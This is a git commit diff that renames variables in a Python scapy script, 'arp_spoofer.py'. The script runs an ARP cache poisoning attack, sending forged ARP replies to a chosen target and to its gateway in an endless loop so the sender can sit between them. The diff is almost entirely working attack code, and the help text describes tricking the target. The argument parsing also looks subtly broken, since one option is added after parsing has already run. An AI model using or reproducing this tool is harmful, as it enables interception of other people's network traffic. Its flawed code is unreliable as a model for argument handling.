2eb834475097337a3a6cd3a67a3d9cedf4ce4673
chris <chrispitillo@gmail.com>
2023-06-20 15:15:29 +0100

    Minor changes to variable names for targets

--- arp_spoofer/arp_spoofer.py
+++ arp_spoofer/arp_spoofer.py
@@ -5,31 +5,31 @@ import argparse
 import time
 
 def main():
-    tar_IP, targetIP2 = get_arguments()
-    packet1 = spoofed_packet(tar_IP, targetIP2)
-    packet2 = spoofed_packet(targetIP2, tar_IP)
+    targetIP_1, targetIP_2 = get_arguments()
+    packet1 = spoofed_packet(targetIP_1, targetIP_2)
+    packet2 = spoofed_packet(targetIP_2, targetIP_1)
     sent_packets = 0
     try:
         while True:
             scapy.send(packet1, verbose=False)
             scapy.send(packet2, verbose=False)
             sent_packets += 2
-            print(f'\r[+] Sent two spoofed packets to {tar_IP} and {targetIP2}. Total sent: {sent_packets}', end='')
+            print(f'\r[+] Sent two spoofed packets to {targetIP_1} and {targetIP_2}. Total sent: {sent_packets}', end='')
             time.sleep(2)
     except KeyboardInterrupt:
         print('\n[+] Exiting...')
 
 
-def spoofed_packet(tar_IP, targetIP2):
+def spoofed_packet(targetIP_1, targetIP_2):
     #gets mac for provided IP first:
-    mac = get_mac(tar_IP)
+    mac = get_mac(targetIP_1)
 
     #Creates a packet to spoofed_packet a target that we are the gateway IP
     #pdst=destination IP (of our target)
     #hwdst=destination MAC (of out target)
     #prsc=projected source (what we're telling this target our fake IP is)
         #reassociates MAC address in target's table for this IP to our MAC
-    packet = scapy.ARP(op=2, pdst=tar_IP, hwdst=mac, psrc=targetIP2)
+    packet = scapy.ARP(op=2, pdst=targetIP_1, hwdst=mac, psrc=targetIP_2)
 
     return packet
 
@@ -49,19 +49,19 @@ def get_mac(ip):
 
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-t', '--target', dest='targetIP1', help="IP of device that user wishes to trick.")
+    parser.add_argument('-t', '--target', dest='targetIP_1', help="IP of device that user wishes to trick.")
     options = parser.parse_args()
-    parser.add_argument('-g', '--gateway', dest='targetIP2', help="IP of the gateway device your target is using and you want to get between.")
+    parser.add_argument('-g', '--gateway', dest='targetIP_2', help="IP of the gateway device your target is using and you want to get between.")
     options = parser.parse_args()
 
-    return options.targetIP1, options.targetIP2
+    return options.targetIP_1, options.targetIP_2
 
 
-def check_args(targetIP1, targetIP2):
-    if targetIP1 == None:
+def check_args(targetIP_1, targetIP_2):
+    if targetIP_1 == None:
         print('Please input a target to trick using the "-t" command.\n(Use --help for help)')
         exit()
-    if targetIP2 == None:
+    if targetIP_2 == None:
         print('Please input an IP of the gateway device your target is using and you want to get between using the "-g" command.\n(Use --help for help)')
         exit()
 
